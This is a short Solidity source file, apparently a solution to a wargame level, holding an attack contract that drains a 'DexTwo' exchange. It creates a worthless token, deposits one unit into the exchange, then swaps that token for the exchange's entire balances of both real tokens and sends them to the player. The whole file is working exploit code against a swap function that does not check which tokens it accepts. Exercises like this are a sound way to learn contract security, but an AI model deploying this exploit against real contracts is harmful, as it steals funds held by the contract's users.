// SPDX-License-Identifier: MIT

pragma solidity^0.8.0;

import {DexTwo, SwappableTokenTwo} from "./dex2.sol";

contract attackContract {
    DexTwo target;
    constructor(DexTwo _target){
        target = _target;
    }
    function attack(address player) public {
    SwappableTokenTwo fake = new SwappableTokenTwo(address(target), "fake", "FK", 4);
    fake.approve(address(this), address(target), type(uint256).max); //approves address(this) owned tokens to be spent by target address

    address t1 = target.token1();
    address t2 = target.token2();

    fake.transfer(address(target), 1);
    target.swap(address(fake), t1, 1);
    target.swap(address(fake), t2, 2);

    SwappableTokenTwo(t1).transfer(player, 100);
    SwappableTokenTwo(t2).transfer(player, 100);
    }
}
